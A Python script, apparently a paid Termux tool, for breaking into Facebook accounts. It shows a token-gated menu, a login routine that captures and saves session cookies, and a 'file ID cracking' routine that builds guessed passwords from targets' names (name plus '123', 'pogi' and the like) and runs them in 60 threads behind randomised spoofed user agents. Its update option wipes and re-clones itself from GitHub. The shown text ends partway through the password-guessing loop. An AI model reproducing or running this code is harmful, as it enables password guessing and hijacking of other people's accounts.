import os, time

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep as slp
from os import system as systm
from bs4 import BeautifulSoup as bs

try:
    import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich
except ImportError:
    systm("pip install requests -y")
from bs4 import BeautifulSoup as bs4

# COLORS
li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"
mxclrs = "38;5"
ro = f"\033[{mxclrs};208"
rb = f"\033[{mxclrs};32"
rc = f"\033[{mxclrs};122m"
rg = f"\033[{mxclrs};112m"
rp = f"\033[{mxclrs};147m"
gxdsprnt = str(f"{li}" * 37)

# ANTI BYPASSING
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    print(f"{lgr}   [✓] BYPASSING PASSED!")
    slp(5)
    print(f"{lr}  [!] LOL, IT'S A PRANK!")
    slp(3)
    exit()
else:
    pass

# YEAR ACCOUNT
def yxxr(yx):
    if len(yx) == 15:
        if yx[:10] in ["1000000000"]:
            yir = "2009"
        elif yx[:9] in ["100000000"]:
            yir = "2009"
        elif yx[:8] in ["10000000"]:
            yir = "2009"
        elif yx[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            yir = "2009"
        elif yx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            yir = "2010"
        elif yx[:6] in ["100001"]:
            yir = "2010-2011"
        elif yx[:6] in ["100002", "100003"]:
            yir = "2011-2012"
        elif yx[:6] in ["100004"]:
            yir = "2012-2013"
        elif yx[:6] in ["100005", "100006"]:
            yir = "2013-2014"
        elif yx[:6] in ["100007", "100008"]:
            yir = "2014-2015"
        elif yx[:6] in ["100009"]:
            yir = "2015"
        elif yx[:5] in ["10001"]:
            yir = "2015-2016"
        elif yx[:5] in ["10002"]:
            yir = "2016-2017"
        elif yx[:5] in ["10003"]:
            yir = "2018"
        elif yx[:5] in ["10004"]:
            yir = "2019"
        elif yx[:5] in ["10005"]:
            yir = "2020"
        elif yx[:5] in ["10006", "10007", "10008", "10009"]:
            yir = "2021-2022"
        else:
            yir = ""
    elif len(yx) == 14:
        yir = "2023"
    elif len(yx) in [9, 10]:
        yir = "2008-2009"
    elif len(yx) == 8:
        yir = "2007-2008"
    elif len(yx) == 7:
        yir = "2006-2007"
    else:
        yir = ""
    return yir


# ANIMATION
gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn4 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
    "✓           ",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

systm("clear")
print(lxgo)
for gxdsloading in range(30):
    slp(0.1)
    sys.stdout.write(
        "\r        LOADING UPDATES: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)]
    )
    sys.stdout.flush()

# TOKEN GENERATOR
spce = ""
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
gxdsid = id1 + spce
gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text


def lxnes():
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{dg}  ————————————————————————————————————————")


# LOOP MENU
loop = 0
oks = []
cps = []
ugen = []

# UA RANDOMIZER
ugen = random.choice(
    [
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; MALN)",
        "Mozilla/5.0 (Linux; Android 10; Redmi K20 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MAEM; InfoPath.2; AskTB5.6)",
        "Mozilla/5.0 (Linux; Android 7.0; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.07.4.5059",
        "Mozilla/5.0 (Linux; Android 9; RMX1945) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4267.0 Safari/537.36 Edg/87.0.649.0",
        "Mozilla/5.0 (Linux; Android 10; SEA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; VTR-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 B5zjdD2e-51 Firefox/80.0",
        "Mozilla/5.0 (Linux; Android 4.4.2; SM-T800X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
        "Opera/9.80 (Android; Opera Mini/15.0.2125/182.104; U; pt) Presto/2.12.423 Version/12.16",
        "Mozilla/5.0 (Linux; Android 10; SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1; SS4G9 Mira) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.1.1; Power 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; SM-G960N Build/LYZ28N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; NovoConnect-NT1000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; MotoG3-TE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; ELE-L29 Build/HUAWEIELE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/282.0.0.10.119;]",
        "Mozilla/5.0 (Linux; Android 8.1.0; TC72) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Redmi Note 4 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 OPR/71.0.3770.171",
        "Mozilla/5.0 (Linux; Android 7.0; Allure M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; RMX1825) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; MW22-A32 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4267.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; TECNO KB8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4263.2 Mobile Safari/537.36,gzip(gfe),gzip(gfe) (Chrome Image Compression Service)",
        "Mozilla/5.0 (Linux; Android 10; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4263.2 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2672.53 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G390F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; Snap 4G2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36/8mqTxTuL-47",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/57.0.2987.92 Chrome/57.0.2987.88 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; MW22-A32 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.0.1; U6H0L12T6A0005NYENEN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.1.2; Dub-the best quality Build/NHG47K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAU; BRI/2; .NET4.0E; .NET4.0C)",
        "Mozilla/5.0 (Linux; Android 10.0; TV BOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; HMS7500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.1.1; NABI2-NV7A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 OPR/71.0.3770.171",
        "Mozilla/5.0 (Linux; Android 6.0.1; eSTAR BEAUTY 2 HD Quad core Build/MXC89K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; MRD-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-J106M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 OPR/71.0.3770.171 (Edition avira-2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.42 Safari/537.36 Edg/86.0.622.19",
        "Mozilla/5.0 (Linux; Android 9; BeyondTV) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 4.3; en-za; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; Android 10; SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-A2070) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; R7kf) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.07.4.5059",
        "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.08.4.5072",
        "Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; LM-X540) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; arm; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 YaApp_Android/20.82 YaSearchBrowser/20.82 BroPP/1.0 SA/1 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Redmi Y3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 159.0.0.28.123 (iPhone10,1; iOS 14_0; en_PE; en-PE; scale = 2.00; 750x1334; 244425769)",
        "Mozilla/5.0 (Linux; Android 8.1; BJ-A216 Build/MXC89L; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Edg/83.0.478.54",
        "Mozilla/5.0 (Linux; Android 9; vivo 1916) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 YaBrowser/20.8.3.112 (rm8ey1icf) Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; BE_et Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; TECNO IN5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1; E5653) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.08.4.5072",
        "Mozilla/5.0 (Linux; Android 9; vivo 1951) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/60.0.3004.55063",
        "Mozilla/5.0 (Linux; Android 9; POT-LX3 Build/HUAWEIPOT-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/285.0.0.43.120;]",
        "Mozilla/5.0 (Linux; Android 10; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36/g96yntHD-43",
        "Mozilla/5.0 (Linux; Android 10; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; VFD 720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; vivo V3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; CAM-L03 Build/HUAWEICAM-L03) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.07.2.5059",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G925I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Mobile Safari/537.36",
    ]
)


def gxdslogo():
    systm("clear")
    print(lxgo)
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [-] GITHUB     :{dg}   /GOXDIES")
    print(f"{lg}  [-] FACEBOOK   :{dg}   /GOXDIES")
    print(f"{lg}  [-] VERSION    :{dg}   0.0.1")
    print(f"{dg}  ————————————————————————————————————————")


# APPROVAL
def apprxval():
    gxdslogo()
    print(f"{dg}")
    for gxdsloading in range(10):
        slp(0.2)
        sys.stdout.write(
            f"\r{dg}  [?] IDENTIFYING YOUR DEVICE TOKEN: "
            + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()

    if gxdsid in gxdsAccess:
        slp(2)
        print("")
        print(f"{lgr}  [✓] HELLO, YOUR TOKEN APPROVED!")
        slp(3)
        mxnu()
    else:
        slp(0.1)
        gxdslogo()
        print(f"{lg}  [✘] TOKEN:\033[1;30m INVALID")
        slp(1)
        for gxdsloading in range(11):
            slp(0.3)
            sys.stdout.write(
                f"\r{lg}  [!] MAKING TOKEN:{dg} "
                + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
            )
            sys.stdout.flush()
        print(f"\n{dg}  ————————————————————————————————————————")
        print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
        lxnes()
        print(f"{rp}  [+] HELLO, CHECK OUR PRICELIST.")
        print(f"{lg}  [-] TRIAL :{dg} ₱000 - 003 DAYS ")
        print(f"{lg}  [-] PAID  :{dg} ₱150 - 015 DAYS ")
        lxnes()
        print(f"{lg}  [1] GET TOKEN ACCESS")
        print(f"{lg}  [2] PRESS ENTER TO REFRESH")
        print(f"{dg}  ————————————————————————————————————————")
        bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
        if bxy == "1":
            systm("xdg-open https://m.me/goxdies")
            slp(1)
            apprxval()
        else:
            gxdslogo()
        print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
        slp(5)
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )


def mxnu():
    gxdslogo()
    print(f"{lg}  [1] FILE ID CRACKING")
    print(f"{lg}  [2] GET YOUR ACC COOKIES")
    print(f"{lg}  [3] FB SHARE BOOSTING")
    print(f"{lg}  [4] CHECK UPDATE")
    print(f"{dg}  ————————————————————————————————————————")
    optixn = input(f"{lgr}  [•] CHOOSE:{dg} ")
    if optixn == "1":
        clxning()
        slp(1)
    elif optixn == "2":
        xcokis()
        slp(2)
        # print(f"{lgr}  [X] MAINTENANCE")
        # slp(3)
        # mxnu()
    elif optixn == "3":
        systm("xdg-open https://xshare.seixtannn.repl.co/")
    elif optixn == "4":
        print("")
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )
        systm("clear")
    else:
        gxdslogo()
        print(f"{lg}  [✘] OPTION:{dg} INVALID")
        mxnu()

# GET COOKIES
def xcokis():
    gxdslogo()
    url = "https://n.facebook.com"
    xurl = url + "/login.php"
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    lxnes()
    try:
        xcuser = input(f"{lgr}  [+] EMAIL:{dg} ")
        xcpwd = input(f"{lgr}  [+] PASSWORD:{dg} ")
        lxnes()
        req = requests.Session()
        req.headers.update(
            {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en_US",
                "cache-control": "max-age=0",
                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ugen,
            }
        )
        with req.get(url) as response_body:
            inspect = bs(response_body.text, "html.parser")
            lsd_key = inspect.find("input", {"name": "lsd"})["value"]
            jazoest_key = inspect.find("input", {"name": "jazoest"})["value"]
            m_ts_key = inspect.find("input", {"name": "m_ts"})["value"]
            li_key = inspect.find("input", {"name": "li"})["value"]
            try_number_key = inspect.find("input", {"name": "try_number"})["value"]
            unrecognized_tries_key = inspect.find(
                "input", {"name": "unrecognized_tries"}
            )["value"]
            bi_xrwh_key = inspect.find("input", {"name": "bi_xrwh"})["value"]
            data = {
                "lsd": lsd_key,
                "jazoest": jazoest_key,
                "m_ts": m_ts_key,
                "li": li_key,
                "try_number": try_number_key,
                "unrecognized_tries": unrecognized_tries_key,
                "bi_xrwh": bi_xrwh_key,
                "email": xcuser,
                "pass": xcpwd,
                "login": "submit",
            }
            response_body2 = req.post(
                xurl, data=data, allow_redirects=True, timeout=300
            )
            cookie = (
                str(req.cookies.get_dict())[1:-1]
                .replace("'", "")
                .replace(",", ";")
                .replace(":", "=")
            )
            if "c_user" in cookie:
                print(f"\r{rc}  {cookie}")
                open("/sdcard/gxds-cookies.txt", "a").write(f"{cookie}\n")
            elif "checkpoint" in cookie:
                print(f"{lr}  [✘] OPPS, CHECKPOINT!")
                slp(2)
                xcokis()
            else:
                print(f"{lr}  [✘] INCORRECT DETAILS")
                slp(2)
                xcokis()
    except requests.exceptions.ConnectionError:
        sys.exit(f"{lr}  [✘] NO INTERNET")
    except KeyboardInterrupt:
        sys.exit(f"{lr}  [✘] STOPPED!")

# RESULT
def result(oks):
    if len(oks) != 0:
        lxnes()
        print(f"{lgr}  [✓] CRACKING COMPLETED")
        print(f"{lgr}  [✓] HIT & COOKIES SAVED IN /SDCARD/GXDS.TXT")
        print(f"{rc}  [+] TOTAL HITS: %s" % str(len(oks)))
        lxnes()
        input(f"{dg}  [+] PRESS ENTER TO GO BACK")
        mxnu()
        
# FILE PATH
def clxning():
    gxdslogo()
    print(
        f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  [-] USE A GOOD ID COMBO FOR A GOOD RESULT."
    )
    lxnes()
    print(f"{dg}  [-] EXAMPLE PATH: /sdcard/yourFile.txt")
    print(f"{dg}  ————————————————————————————————————————")
    fl = input(f"{lgr}  [+] FILE PATH:{dg} ")
    print("  ")
    try:
        gxdsfiles = open(fl, "r").read().splitlines()
    except:
        slp(1)
        print(f"\n{lr}  [✘] FILE NOT FOUND.")
        print(gxdsprnt)
        slp(3)
        clxning()
    fxles(gxdsfiles)
    
    
# FILE CLONING
def fxles(gxdsfiles):
    slp(1)
    gxdslogo()
    tl = str(len(gxdsfiles))
    print(f"{lg}  [+] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS.")
    lxnes()
    print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)

    # PASSWORD LIST
    with ThreadPool(max_workers=60) as GOXDIES:
        for data in gxdsfiles:
            uid = data.split("|")[0]
            pxss = []
            nxme = data.split("|")[1]
            name = nxme.lower()
            try:
                fxrst = name.split(" ")[0]
                nxme1 = nxme.split(" ")[0]
                if len(fxrst) < 3:
                    pass
                else:
                    pxss.append(nxme1)
                    pxss.append(fxrst + fxrst)
                    pxss.append(fxrst + "pogi")
                    pxss.append(fxrst + "ganda")
                    pxss.append(fxrst + "12")
                    pxss.append(fxrst + "123")
                    pxss.append(fxrst + "143")
                    pxss.append(fxrst + "12345")
            except:
                pass
            try:
                lxst = name.split(" ")[1]
                nxme2 = nxme.split(" ")[1]
                if len(lxst) < 3:
                    pass
                else:
                    pxss.append(nxme2)
                    pxss.append("@" + fxrst + "." + lxst)
                    pxss.append(fxrst + lxst)
                    pxss.append(fxrst + lxst + "123")
                    pxss.append(fxrst + lxst + "1234")
                    pxss.append(fxrst + lxst + "12345")
            except:
